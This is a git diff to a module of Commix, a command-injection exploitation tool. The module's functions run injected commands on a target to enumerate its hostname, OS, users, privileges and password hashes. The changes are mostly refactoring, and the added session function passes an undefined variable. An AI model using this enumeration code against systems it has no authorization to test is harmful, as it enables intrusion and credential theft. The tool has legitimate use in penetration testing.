@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -17,6 +17,7 @@ import re
 import sys
 from src.utils import logs
 from src.utils import menu
+from src.utils import common
 from src.utils import settings
 from src.utils import session_handler
 from src.core.injections.controller import checks
@@ -52,7 +53,7 @@ Hostname enumeration
 """
 def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   _ = False
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     settings.HOSTNAME = settings.WIN_HOSTNAME
   cmd = settings.HOSTNAME
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
@@ -69,7 +70,7 @@ Retrieve system information
 """
 def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   _ = False
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
   cmd = settings.RECOGNISE_OS
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
@@ -81,9 +82,9 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   target_os = output
   if settings.VERBOSITY_LEVEL == 0 and _:
-    print(settings.SINGLE_WHITESPACE)
+    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
   if target_os:
-    if settings.TARGET_OS != "win":
+    if settings.TARGET_OS != settings.OS.WINDOWS:
       cmd = settings.DISTRO_INFO
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
         check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
@@ -93,19 +94,21 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
       distro_name = output
       if len(distro_name) != 0:
           target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
-    if settings.TARGET_OS == "win":
+    if settings.TARGET_OS == settings.OS.WINDOWS:
       cmd = settings.WIN_RECOGNISE_HP
     else:
       cmd = settings.RECOGNISE_HP
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
       if settings.VERBOSITY_LEVEL == 0 and _:
-        sys.stdout.write("\n")
+        settings.print_data_to_stdout("\n")
       # The main command injection exploitation.
       check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
       session_handler.store_cmd(url, cmd, output, vuln_parameter)
     else:
       output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     target_arch = output
+  else:
+    target_arch = None
   checks.print_os_info(target_os, target_arch, filename, _)
 
 """
@@ -113,7 +116,7 @@ The current user enumeration
 """
 def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   _ = False
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     settings.CURRENT_USER = settings.WIN_CURRENT_USER
   cmd = settings.CURRENT_USER
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
@@ -127,11 +130,11 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
 
 
 """
-Check if the current user has excessive privileges.
+Check if the Current user is privileged.
 """
 def check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   _ = False
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.IS_ADMIN
   else:
     cmd = settings.IS_ROOT
@@ -143,14 +146,14 @@ def check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whites
   else:
     shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   checks.print_current_user_privs(shell, filename, _)
-    
+
 """
 System users enumeration
 """
 def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   _ = False
   cmd = settings.SYS_USERS
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.WIN_SYS_USERS
     cmd = cmd + settings.WIN_REPLACE_WHITESPACE
     # URL encode "+ " if POST request and python alternative shell.
@@ -175,13 +178,13 @@ System passwords enumeration
 def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   _ = False
   cmd = settings.SYS_PASSES
-  #print(settings.SINGLE_WHITESPACE)
+  #settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     _ = True
     if output == False:
       output = ""
-    session_handler.store_cmd(url, cmd, output, vuln_parameter)  
+    session_handler.store_cmd(url, cmd, output, vuln_parameter)
   else:
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   sys_passes = output
@@ -197,11 +200,11 @@ def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
     check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     if settings.VERBOSITY_LEVEL == 0:
-      print(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
   else:
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     check_how_long = 0
-  checks.print_single_os_cmd(cmd, output)
+  checks.print_single_os_cmd(cmd, output, filename)
   return check_how_long, output
 
 """
@@ -211,60 +214,86 @@ def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, h
   def reset():
     if settings.ENUMERATION_DONE:
       settings.ENUMERATION_DONE = False
-  
-  reset()  
+
+  reset()
   if menu.options.ps_version and settings.PS_ENABLED == None:
     if not checks.ps_incompatible_os():
       if settings.ENUMERATION_DONE:
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
       checks.print_enumenation().ps_version_msg()
       powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
       reset()
 
   if menu.options.hostname:
     if settings.ENUMERATION_DONE:
-      print(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     checks.print_enumenation().hostname_msg()
     hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     reset()
 
   if menu.options.current_user:
     if settings.ENUMERATION_DONE:
-      print(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     checks.print_enumenation().current_user_msg()
     current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     reset()
 
   if menu.options.is_root or menu.options.is_admin:
     if settings.ENUMERATION_DONE:
-      print(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     checks.print_enumenation().check_privs_msg()
     check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     reset()
 
   if menu.options.sys_info:
     if settings.ENUMERATION_DONE:
-      print(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     checks.print_enumenation().os_info_msg()
     system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     reset()
 
   if menu.options.users:
     if settings.ENUMERATION_DONE:
-      print(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     checks.print_enumenation().print_users_msg()
     system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     reset()
 
   if menu.options.passwords:
     if settings.ENUMERATION_DONE:
-      print(settings.SINGLE_WHITESPACE)
-    if settings.TARGET_OS == "win":
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    if settings.TARGET_OS == settings.OS.WINDOWS:
       check_option = "--passwords"
       checks.unavailable_option(check_option)
     else:
       checks.print_enumenation().print_passes_msg()
       system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     reset()
+
+"""
+Check stored session
+"""
+def stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+  if settings.ENUMERATION_DONE == True :
+    while True:
+      message = "Do you want to ignore stored session and enumerate again? [y/N] > "
+      enumerate_again = common.read_input(message, default="N", check_batch=True)
+      if enumerate_again in settings.CHOICE_YES:
+        if not menu.options.ignore_session:
+          menu.options.ignore_session = True
+        do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+        break
+      elif enumerate_again in settings.CHOICE_NO:
+        break
+      elif enumerate_again in settings.CHOICE_QUIT:
+        # Delete previous shell (text) files (output) from temp.
+        tfb_injector.delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+        raise SystemExit()
+      else:
+        common.invalid_option(enumerate_again)
+        pass
+  else:
+    if menu.enumeration_options():
+      do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
 
 # eof
